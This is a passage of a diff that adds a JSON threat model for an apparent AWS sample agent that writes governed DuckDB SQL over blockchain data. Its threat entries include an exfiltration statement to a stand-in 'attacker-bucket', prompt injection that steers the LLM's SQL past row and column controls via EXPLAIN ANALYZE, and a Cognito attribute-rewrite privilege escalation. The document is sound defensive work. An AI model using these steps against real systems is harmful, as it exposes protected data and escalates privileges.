+    "jwt",
+    "cognito"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T007",
+   "numericId": 7,
+   "threatSource": "Malicious or compromised calling application (SigV4 path)",
+   "prerequisites": "IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity",
+   "threatAction": "Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy",
+   "threatImpact": "Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A002"
+   ],
+   "statement": "A Malicious or compromised calling application (SigV4 path) IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity can Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy, which leads to Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source",
+   "displayOrder": 7,
+   "status": "threatResolved",
+   "tags": [
+    "identity-assertion",
+    "trust-assumption"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T008",
+   "numericId": 8,
+   "threatSource": "Attacker with access to the analyst's machine or environment",
+   "prerequisites": "The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password",
+   "threatAction": "Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to",
+   "threatImpact": "Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A002",
+    "A003"
+   ],
+   "statement": "A Attacker with access to the analyst's machine or environment The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password can Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to, which leads to Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity",
+   "displayOrder": 8,
+   "status": "threatResolved",
+   "tags": [
+    "ui",
+    "token-theft",
+    "default-credentials"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T009",
+   "numericId": 9,
+   "threatSource": "Restricted end user",
+   "prerequisites": "Valid restricted session; CLS policy denies a column (subject_identity)",
+   "threatAction": "Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing",
+   "threatImpact": "Partial disclosure of denied-column information without direct selection",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Restricted end user Valid restricted session; CLS policy denies a column (subject_identity) can Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing, which leads to Partial disclosure of denied-column information without direct selection",
+   "displayOrder": 9,
+   "status": "threatResolved",
+   "tags": [
+    "side-channel",
+    "inference"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T010",
+   "numericId": 10,
+   "threatSource": "Restricted end user",
+   "prerequisites": "Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming",
+   "threatAction": "Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions",
+   "threatImpact": "Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs",
+   "impactedGoal": [],
+   "impactedAssets": [],
+   "statement": "A Restricted end user Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming can Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions, which leads to Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs",
+   "displayOrder": 10,
+   "status": "threatResolved",
+   "tags": [
+    "resource-exhaustion",
+    "cost"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T011",
+   "numericId": 11,
+   "threatSource": "Operator error (customer deployer)",
+   "prerequisites": "Operator writes GOVERNANCE_POLICIES JSON by hand",
+   "threatAction": "Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended",
+   "threatImpact": "Unintended data exposure to restricted principals; worst case default role is unrestricted",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A004"
+   ],
+   "statement": "A Operator error (customer deployer) Operator writes GOVERNANCE_POLICIES JSON by hand can Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended, which leads to Unintended data exposure to restricted principals; worst case default role is unrestricted",
+   "displayOrder": 11,
+   "status": "threatResolved",
+   "tags": [
+    "misconfiguration",
+    "policy"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T012",
+   "numericId": 12,
+   "threatSource": "Restricted end user",
+   "prerequisites": "Valid restricted session; DESCRIBE-based schema probe active for CLS intersection",
+   "threatAction": "Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink",
+   "threatImpact": "Denied columns leak through a stale or failed schema probe",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Restricted end user Valid restricted session; DESCRIBE-based schema probe active for CLS intersection can Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink, which leads to Denied columns leak through a stale or failed schema probe",
+   "displayOrder": 12,
+   "status": "threatResolved",
+   "tags": [
+    "schema-probe",
+    "cache"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T013",
+   "numericId": 13,
+   "threatSource": "Any principal via agent-generated SQL",
+   "prerequisites": "Gate must block writes for the model to hold",
+   "threatAction": "Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time",
+   "threatImpact": "Data exfiltration to external targets or persistence beyond the session",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Any principal via agent-generated SQL Gate must block writes for the model to hold can Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time, which leads to Data exfiltration to external targets or persistence beyond the session",
+   "displayOrder": 13,
+   "status": "threatResolved",
+   "tags": [
+    "exfiltration",
+    "write-gate"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T014",
+   "numericId": 14,
+   "threatSource": "Concurrent tool calls within one session (Strands thread execution)",
+   "prerequisites": "LLM issues multiple run_sql calls in one message; shared DuckDB connection",
+   "threatAction": "Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution",
+   "threatImpact": "Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage",
+   "impactedGoal": [],
+   "impactedAssets": [],
+   "statement": "A Concurrent tool calls within one session (Strands thread execution) LLM issues multiple run_sql calls in one message; shared DuckDB connection can Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution, which leads to Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage",
+   "displayOrder": 14,
+   "status": "threatResolved",
+   "tags": [
+    "concurrency",
+    "race"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T015",
+   "numericId": 15,
+   "threatSource": "Sample consumer (customer engineer)",
+   "prerequisites": "Customer lifts governance.py into a production multi-principal service",
+   "threatAction": "Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model",
+   "threatImpact": "Cross-principal policy application: user A's query rewritten under user B's policy",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Sample consumer (customer engineer) Customer lifts governance.py into a production multi-principal service can Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model, which leads to Cross-principal policy application: user A's query rewritten under user B's policy",
+   "displayOrder": 15,
+   "status": "threatResolved",
+   "tags": [
+    "misuse-of-sample",
+    "documentation"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T016",
+   "numericId": 16,
+   "threatSource": "Restricted end user observing the streaming trace",
+   "prerequisites": "Valid restricted session; the SSE trace emits gate/govern/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[])",
+   "threatAction": "Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges",
+   "threatImpact": "Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A004"
+   ],
+   "statement": "A Restricted end user observing the streaming trace Valid restricted session; the SSE trace emits gate/govern/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[]) can Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges, which leads to Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure",
+   "displayOrder": 16,
+   "status": "threatResolved",
+   "tags": [
+    "trace",
+    "sse",
+    "policy-disclosure",
+    "new-in-v2"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T017",
+   "numericId": 17,
+   "threatSource": "Restricted end user via LLM prompt injection",
+   "prerequisites": "Valid restricted session; the governance rewrite is driven by a sqlglot parse and the read-only gate accepts EXPLAIN as a read keyword",
+   "threatAction": "Submits a statement shape sqlglot cannot model (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>), which parses to an opaque Command node carrying no table references, so the rewrite loop finds nothing to guard and returns the statement untouched",
+   "threatImpact": "Ungoverned execution of the inner query: EXPLAIN ANALYZE really runs it and reports true cardinalities of policy-denied rows in the query plan - a side-channel oracle over denied data, and a passthrough for any shape that returns rows",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Restricted end user via LLM prompt injection Valid restricted session; the governance rewrite is driven by a sqlglot parse and the read-only gate accepts EXPLAIN as a read keyword can Submits a statement shape sqlglot cannot model (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>), which parses to an opaque Command node carrying no table references, so the rewrite loop finds nothing to guard and returns the statement untouched, which leads to Ungoverned execution of the inner query: EXPLAIN ANALYZE really runs it and reports true cardinalities of policy-denied rows in the query plan - a side-channel oracle over denied data, and a passthrough for any shape that returns rows",
+   "displayOrder": 17,
+   "status": "threatResolved",
+   "tags": [
+    "authz-bypass",
+    "parser-coverage",
+    "fail-open",
+    "phase-7.5-round-2"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T018",
+   "numericId": 18,
+   "threatSource": "Restricted end user (authenticated, low privilege) at the identity source",
+   "prerequisites": "Valid Cognito login; the app client carries no explicit attribute permissions, so it may write every attribute including custom ones; the agent's authorization is entirely claim-driven",
+   "threatAction": "Calls UpdateUserAttributes with their own access token to set custom:role=admin (and custom:tenant=ops), then re-authenticates to obtain an ID token carrying the escalated claims",
+   "threatImpact": "Total privilege escalation: the authorization layer honours the rewritten claims, so a junior analyst becomes the unrestricted ops:admin principal - every row, every column, raw path access, across all four access methods",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001",
+    "A002",
+    "A003"
+   ],
+   "statement": "A Restricted end user (authenticated, low privilege) at the identity source Valid Cognito login; the app client carries no explicit attribute permissions, so it may write every attribute including custom ones; the agent's authorization is entirely claim-driven can Calls UpdateUserAttributes with their own access token to set custom:role=admin (and custom:tenant=ops), then re-authenticates to obtain an ID token carrying the escalated claims, which leads to Total privilege escalation: the authorization layer honours the rewritten claims, so a junior analyst becomes the unrestricted ops:admin principal - every row, every column, raw path access, across all four access methods",
+   "displayOrder": 18,
+   "status": "threatResolved",
+   "tags": [
+    "privilege-escalation",
+    "identity-source",
+    "cognito",
+    "phase-7.5-round-2"
+   ],
+   "metadata": []
+  }
+ ],
+ "businessContext": {
+  "description": "Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance).",
+  "features": {
+   "industry_sector": "Technology",
+   "sensitivity_tier": "Public",
+   "user_base_size": "Nano",
+   "geographic_scope": "Global / Transboundary",
+   "regulatory_requirements": [
+    "None"
+   ],
+   "system_criticality": "Low",
+   "financial_impact": "Negligible",
+   "authentication_requirement": "Federated",
+   "deployment_model": "Serverless / FaaS",
+   "user_base_metric": "Installs / downloads",
+   "revenue_band": "Enterprise",
+   "geographic_profile": {
+    "data_residency": "National / Single-Country",
+    "compute_location": "National / Single-Country",
+    "user_base_location": "Global / Transboundary",
+    "organizational_headquarters": "National / Single-Country"
+   }
+  }
+ },
+ "components": [
+  {
+   "id": "C001",
+   "name": "Streamlit chat UI",
+   "type": "Compute",
+   "service_provider": "Other",
+   "specific_service": "Streamlit (local/self-hosted)",
+   "version": null,
+   "description": "Chat client: Cognito USER_PASSWORD_AUTH login (app client secret from env), sends the ID token as Bearer over raw HTTPS to the runtime, parses the SSE envelope stream, renders the interleaved reasoning+tool transcript and a Trace tab. Holds the user's ID token and the app client secret in process memory.",
+   "configuration": null
+  },
+  {
+   "id": "C002",
+   "name": "Amazon Cognito user pool",
+   "type": "Security",
+   "service_provider": "AWS",
+   "specific_service": "Amazon Cognito",
+   "version": null,
+   "description": "Identity provider: user pool with custom:tenant/custom:role attributes; app client (with secret) using USER_PASSWORD_AUTH. Issues ID tokens whose aud = app client id; the runtime authorizer validates allowedAudience against it.",
+   "configuration": null
+  },
+  {
+   "id": "C003",
+   "name": "AgentCore Runtime + inbound JWT authorizer (managed)",
+   "type": "Compute",
+   "service_provider": "AWS",
+   "specific_service": "Amazon Bedrock AgentCore Runtime",
+   "version": null,
+   "description": "One microVM per session; hosts the agent process. Managed customJWTAuthorizer validates the Cognito ID token (signature via discovery URL, allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards Authorization. Serves the async-generator entrypoint as SSE. AWS-managed, out of sample scope.",
+   "configuration": null
+  },
+  {
+   "id": "C004",
+   "name": "Identity resolution (_resolve_claims)",
+   "type": "Security",
+   "service_provider": null,
+   "specific_service": null,
+   "version": null,
+   "description": "agent.py: extracts claims in trust order: verified JWT claims (custom:tenant/custom:role normalized to tenant/role) -> X-Amzn-Bedrock-AgentCore-Runtime-User-Id header (SigV4 caller asserts) -> payload identity object -> default role. jwt.decode(verify_signature=False) is claims EXTRACTION from a token already verified by the managed authorizer.",
+   "configuration": null
+  },
+  {
+   "id": "C005",
+   "name": "Strands Agent + Bedrock Claude",
+   "type": "Compute",
+   "service_provider": "AWS",
+   "specific_service": "Amazon Bedrock",
+   "version": null,
+   "description": "LLM writes SQL from natural-language questions; reads tool results; emits streaming events. Its SQL output is untrusted input to the pipeline. The streaming entrypoint maps Strands events to typed SSE envelopes including the per-statement gate/govern/execute trace.",
+   "configuration": null
+  },
+  {
+   "id": "C006",
+   "name": "run_sql gate (single-statement + read-only)",
+   "type": "Security",
+   "service_provider": null,
+   "specific_service": null,
+   "version": null,
+   "description": "agent.py: async-generator tool. Gate strips leading SQL comments for keyword classification, requires EXACTLY ONE statement (duckdb.extract_statements \u2014 the engine's own parser, no lexer divergence), and allowlists read statements + CREATE TEMP TABLE/VIEW; rejects persistent writes, ATTACH, COPY TO, and multi-statement smuggling. First control in the SQL pipeline; emits gate trace events.",
+   "configuration": null
+  },
+  {
+   "id": "C007",
+   "name": "Governance rewrite (governance.py)",
+   "type": "Security",
+   "service_provider": null,
+   "specific_service": null,
+   "version": null,
+   "description": "AuthZ layer: principal->role->policy (unknown role in a known tenant falls back to that tenant's MOST restricted policy, content-derived ranking); sqlglot AST rewrite \u2014 RLS predicates via guarded subqueries, schema-aware CLS EXCLUDE, explicit denied-column selection rejected with a legible policy error, raw table functions governed by an AST-shape ALLOWLIST (only exp.Identifier FROM/JOIN sources; pure generators excepted), fail-closed on parse failure. Runs after the gate, before the engine; emits govern trace events (rls[]/cls[]/rejection).",
+   "configuration": null
+  },
+  {
+   "id": "C008",
+   "name": "DuckDB engine (in-process)",
+   "type": "Analytics",
+   "service_provider": null,
+   "specific_service": null,
+   "version": null,
+   "description": "In-memory embedded OLAP engine; dies with the session; READ_ONLY catalog attaches; resource envelope via memory_limit + spill. Executes only gated+governed single statements under _conn_lock serialization.",
+   "configuration": null
+  },
+  {
+   "id": "C009",
+   "name": "CloudWatch Logs",
+   "type": "Other",
+   "service_provider": "AWS",
+   "specific_service": "Amazon CloudWatch",
+   "version": null,
+   "description": "Runtime logs incl. per-query engine metrics and governed flag.",
+   "configuration": null
+  }
+ ],
+ "connections": [
+  {
+   "id": "CN001",
+   "source_id": "C001",
+   "destination_id": "C002",
+   "protocol": "HTTPS",
+   "port": 443,
+   "encryption": true,
+   "description": "UI logs the user in (USER_PASSWORD_AUTH + SECRET_HASH); Cognito returns ID/access/refresh tokens. UI keeps the ID token for the bearer header."
+  },
+  {
+   "id": "CN002",
+   "source_id": "C001",
+   "destination_id": "C003",
+   "protocol": "HTTPS",
+   "port": 443,
+   "encryption": true,
+   "description": "UI POSTs {prompt} to the runtime /invocations endpoint with Authorization: Bearer <ID token> and a session id header; consumes the SSE envelope stream (text/reasoning/tool_start/trace/result) back. The managed authorizer validates the token before agent code runs."
+  },
+  {
+   "id": "CN003",
+   "source_id": "C003",
+   "destination_id": "C004",
+   "protocol": "HTTPS",
+   "port": null,
+   "encryption": true,
+   "description": "Runtime invokes the agent entrypoint with allowlisted headers (Authorization JWT already validated by the managed authorizer) + payload. Claims extraction happens in _resolve_claims."
+  },
+  {
+   "id": "CN004",
+   "source_id": "C004",
+   "destination_id": "C007",
+   "protocol": "Other",
+   "port": null,
+   "encryption": true,
+   "description": "Resolved principal (tenant:role) sets the active role for the session; governance resolves role -> policy (unknown role -> tenant's most restricted)."
+  },
+  {
+   "id": "CN005",
+   "source_id": "C005",
+   "destination_id": "C006",
+   "protocol": "Other",
+   "port": null,
+   "encryption": true,
+   "description": "LLM emits SQL via the run_sql tool call; enters the single-statement read-only gate. UNTRUSTED input crossing."
+  },
+  {
+   "id": "CN006",
+   "source_id": "C006",
+   "destination_id": "C007",
+   "protocol": "Other",
+   "port": null,
+   "encryption": true,
+   "description": "Gate-passed single statement enters the governance rewrite (RLS/CLS injection, denied-column rejection, raw-path allowlist, fail-closed parse)."
+  },
+  {
+   "id": "CN007",
+   "source_id": "C007",
+   "destination_id": "C008",
+   "protocol": "Other",
+   "port": null,
+   "encryption": true,
+   "description": "Governed SQL executes on the in-process engine under _conn_lock serialization."
+  },
+  {
+   "id": "CN008",
+   "source_id": "C008",
+   "destination_id": "D001",
+   "protocol": "HTTPS",
+   "port": 443,
+   "encryption": true,
+   "description": "Engine reads S3/Iceberg/DuckLake data over httpfs with the execution role's scoped read-only credentials (SigV4, TLS)."
+  },
+  {
+   "id": "CN009",
+   "source_id": "C008",
+   "destination_id": "D002",
+   "protocol": "HTTPS",
+   "port": 443,
+   "encryption": true,
+   "description": "Engine reads the label-table Parquet files (attribution joins) with the same scoped read-only role."
+  },
+  {
+   "id": "CN010",
+   "source_id": "C008",
+   "destination_id": "D003",
+   "protocol": "HTTPS",
+   "port": 443,
+   "encryption": true,
+   "description": "Optional: fetch DuckLake PostgreSQL catalog credentials from Secrets Manager at attach time."
+  },
+  {
+   "id": "CN011",
+   "source_id": "C005",
+   "destination_id": "C003",
+   "protocol": "HTTPS",
+   "port": 443,
+   "encryption": true,
+   "description": "Agent model loop calls Amazon Bedrock (Claude) via the runtime's execution role; streaming events flow back through the entrypoint to the SSE channel."
+  },
+  {
+   "id": "CN012",
+   "source_id": "C003",
+   "destination_id": "C009",
+   "protocol": "HTTPS",
+   "port": 443,
+   "encryption": true,
+   "description": "Runtime/agent logs to CloudWatch incl. engine metrics and governed flag."
+  }
+ ],
+ "dataStores": [
+  {
+   "id": "D001",
+   "name": "S3 analytical data (4 access paths)",
+   "type": "Object Storage",
+   "classification": "Public",
+   "encryption_at_rest": true,
+   "backup_frequency": null,
+   "description": "Amazon S3 / S3 Tables / Glue Data Catalog / DuckLake: same logical tables reachable via raw Parquet glob, S3 Tables Iceberg REST, Glue federated Iceberg REST, and DuckLake catalog. All attached READ_ONLY. Buckets: SSE, BlockPublicAccess.BLOCK_ALL, enforce_ssl. Sample data public; customer-substituted data may be confidential."
+  },
+  {
+   "id": "D002",
+   "name": "Label tables on S3 (OFAC + synthetic CEX)",
+   "type": "Object Storage",
+   "classification": "Internal",
+   "encryption_at_rest": true,
+   "backup_frequency": null,
+   "description": "ofac_addresses.parquet (real public OFAC SDN list) and cex_deposit_labels.parquet (synthetic; subject_identity mimics KYC linkage and is the CLS-protected column) under LABELS_PREFIX on the hardened bucket."
+  },
+  {
+   "id": "D003",
+   "name": "Secrets Manager (DuckLake PG credentials)",
+   "type": "Other",
+   "classification": "Restricted",
+   "encryption_at_rest": true,
+   "backup_frequency": null,
+   "description": "AWS Secrets Manager: optional PostgreSQL catalog credentials for the multi-writer DuckLake form; fetched at runtime by the execution role; never in env or code."
+  }
+ ],
+ "threatActors": [
+  {
+   "id": "TA001",
+   "type": "Insider Threat",
+   "name": "Insider",
+   "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
+   "motivations": [
+    "Financial gain",
+    "Revenge / grievance"
+   ],
+   "resources": "Individual",
+   "description": "The model's PRIMARY adversary: a legitimately authenticated but restricted analyst (valid Cognito login, restricted tenant:role) who crafts natural-language questions to steer the LLM into SQL that bypasses the RLS/CLS rewrite \u2014 cross-tenant rows, denied columns, raw file reads, or multi-statement smuggling.",
+   "priority": 1,
+   "is_relevant": true,
+   "reviewed": true,
+   "relationship_to_target": "Internal",
+   "state_nexus": "None",
+   "targeting_specificity": "Targeted"
+  },
+  {
+   "id": "TA002",
+   "type": "External Attacker",
+   "name": "External Attacker",
+   "sophistication_tier": "Tier 1 - Opportunistic / script kiddie",
+   "motivations": [
+    "Financial gain"
+   ],
+   "resources": "Club / small group",
+   "description": "External party probing a deployed sample's public runtime endpoint: forged/absent JWTs, token-audience confusion, or replaying captured bearer tokens.",
+   "priority": 2,
+   "is_relevant": true,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "None",
+   "targeting_specificity": "Opportunistic"
+  },
+  {
+   "id": "TA003",
+   "type": "Nation-State / APT",
+   "name": "Nation-state Actor",
+   "sophistication_tier": "Tier 5 - Nation-state APT / elite",
+   "motivations": [
+    "Espionage / intelligence collection"
+   ],
+   "resources": "Government",
+   "description": "A state intelligence or military group operating with advanced capabilities",
+   "priority": 0,
+   "is_relevant": false,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "State-executed",
+   "targeting_specificity": "Targeted"
+  },
+  {
+   "id": "TA004",
+   "type": "Hacktivist",
+   "name": "Hacktivist",
+   "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
+   "motivations": [
+    "Ideological / hacktivism"
+   ],
+   "resources": "Contest / crowd",
+   "description": "An individual or group motivated by ideological or political beliefs",
+   "priority": 0,
+   "is_relevant": false,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "None",
+   "targeting_specificity": "Sector-focused"
+  },
+  {
+   "id": "TA005",
+   "type": "Financially Motivated Cybercriminal / Organized Crime",
+   "name": "Organized Crime",
+   "sophistication_tier": "Tier 3 - Organized cybercrime",
+   "motivations": [
+    "Financial gain"
+   ],
+   "resources": "Organization",
+   "description": "A criminal organization with significant resources",
+   "priority": 0,
+   "is_relevant": false,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "None",
+   "targeting_specificity": "Opportunistic"
+  },
+  {
+   "id": "TA006",
+   "type": "Competitor / Corporate Espionage",
+   "name": "Competitor",
+   "sophistication_tier": "Tier 3 - Organized cybercrime",
+   "motivations": [
+    "Competitive advantage",
+    "Espionage / intelligence collection"
+   ],
+   "resources": "Organization",
+   "description": "A business competitor seeking competitive advantage",
+   "priority": 0,
+   "is_relevant": false,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "None",
+   "targeting_specificity": "Targeted"
+  },
+  {
+   "id": "TA007",
+   "type": "Script Kiddie / Novice",
+   "name": "Script Kiddie",
+   "sophistication_tier": "Tier 1 - Opportunistic / script kiddie",
+   "motivations": [
+    "Thrill-seeking / notoriety"
+   ],
+   "resources": "Individual",
+   "description": "Opportunistic scanning of exposed demo deployments (default test users with a documented password are provisioned by the sample's CDK \u2014 rotating them is the deployer's job).",
+   "priority": 5,
+   "is_relevant": true,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "None",
+   "targeting_specificity": "Opportunistic"
+  },
+  {
+   "id": "TA008",
+   "type": "Disgruntled Employee",
+   "name": "Disgruntled Employee",
+   "sophistication_tier": "Tier 1 - Opportunistic / script kiddie",
+   "motivations": [
+    "Revenge / grievance"
+   ],
+   "resources": "Individual",
+   "description": "A current or former employee with a grievance",
+   "priority": 0,
+   "is_relevant": false,
+   "reviewed": true,
+   "relationship_to_target": "Internal",
+   "state_nexus": "None",
+   "targeting_specificity": "Targeted"
+  },
+  {
+   "id": "TA009",
+   "type": "Privileged User",
+   "name": "Privileged User",
+   "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
+   "motivations": [
+    "Financial gain"
+   ],
+   "resources": "Individual",
+   "description": "Operator misconfiguration as an unintentional threat: malformed GOVERNANCE_POLICIES, deploying without the inbound authorizer, or leaking the Cognito app client secret.",
+   "priority": 4,
+   "is_relevant": true,
+   "reviewed": true,
+   "relationship_to_target": "Internal",
+   "state_nexus": "None",
+   "targeting_specificity": "Targeted"
+  },
+  {
+   "id": "TA010",
+   "type": "Third Party",
+   "name": "Third Party",
+   "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
+   "motivations": [
+    "Financial gain"
+   ],
+   "resources": "Organization",
+   "description": "A compromised calling application on the SigV4 path (local/CLI), able to assert arbitrary tenant:role via the user-id header or payload identity \u2014 documented trust assumption, unused under the deployed JWT authorizer.",
+   "priority": 3,
+   "is_relevant": true,
+   "reviewed": true,
+   "relationship_to_target": "Partner / third-party",
+   "state_nexus": "None",
+   "targeting_specificity": "Opportunistic"
+  },
+  {
+   "id": "TA011",
+   "type": "Terrorist Organization",
+   "name": "Terrorist Organization",
+   "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
+   "motivations": [
+    "Ideological / hacktivism",
+    "Disruption / destruction"
+   ],
+   "resources": "Club / small group",
+   "description": "A group with limited offensive cyber capability, primarily using the internet for propaganda and recruitment",
+   "priority": 0,
+   "is_relevant": false,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "None",
+   "targeting_specificity": "Sector-focused"
+  },
+  {
+   "id": "TA012",
+   "type": "Private Sector Offensive Actor / Cyber Mercenary",
+   "name": "Private Sector Offensive Actor",
+   "sophistication_tier": "Tier 4 - State-nexus / advanced",
+   "motivations": [
+    "Financial gain"
+   ],
+   "resources": "Organization",
+   "description": "A commercial vendor developing zero-day exploits and spyware for client-selected targets",
+   "priority": 0,
+   "is_relevant": false,
+   "reviewed": true,
+   "relationship_to_target": "External",
+   "state_nexus": "State-aligned",
+   "targeting_specificity": "Targeted"
+  }
+ ],
+ "trustZones": [
+  {
+   "id": "TZ001",
+   "name": "Client side (UI + end user + LLM output)",
+   "trust_level": "Untrusted",
+   "contained_nodes": [
+    "C001",
+    "C005"
+   ],
+   "description": "The Streamlit UI runs on the analyst's machine (holds ID token + app client secret in process env/memory); natural-language questions from end users AND the SQL the LLM generates from them. Prompt injection makes LLM output attacker-influenced."
+  },
+  {
+   "id": "TZ002",
+   "name": "AWS managed platform",
+   "trust_level": "High",
+   "contained_nodes": [
+    "C002",
+    "C003",
+    "C009"
+   ],
+   "description": "Cognito user pool (token issuance), AgentCore Runtime + managed JWT authorizer (microVM isolation, pre-code token validation), Bedrock service, CloudWatch. AWS-operated; trusted per the shared-responsibility model."
+  },
+  {
+   "id": "TZ003",
+   "name": "Agent process (sample code)",
+   "trust_level": "Medium",
+   "contained_nodes": [
+    "C004",
+    "C006",
+    "C007",
+    "C008"
+   ],
+   "description": "The session's microVM process: identity resolution, single-statement read-only gate, governance rewrite, in-process DuckDB. Executes untrusted SQL under layered controls; one session = one principal = one engine."
+  },
+  {
+   "id": "TZ004",
+   "name": "Customer account data plane",
+   "trust_level": "High",
+   "contained_nodes": [
+    "D001",
+    "D002",
+    "D003"
+   ],
+   "description": "S3 buckets/catalogs (analytical data + label tables), Secrets Manager entries in the customer's own account, reached only via the scoped read-only execution role."
+  }
+ ],
+ "crossingPoints": [
+  {
+   "id": "CP001",
+   "source_zone_id": "TZ001",
+   "destination_zone_id": "TZ002",
+   "connection_ids": [
+    "CN001"
+   ],
+   "authentication_method": "Password",
+   "authorization_method": "None",
+   "description": "UI login at Cognito (USER_PASSWORD_AUTH + SECRET_HASH with the app client secret); Cognito issues ID/access/refresh tokens."
+  },
+  {
+   "id": "CP002",
+   "source_zone_id": "TZ001",
+   "destination_zone_id": "TZ002",
+   "connection_ids": [
+    "CN002"
+   ],
+   "authentication_method": "Token",
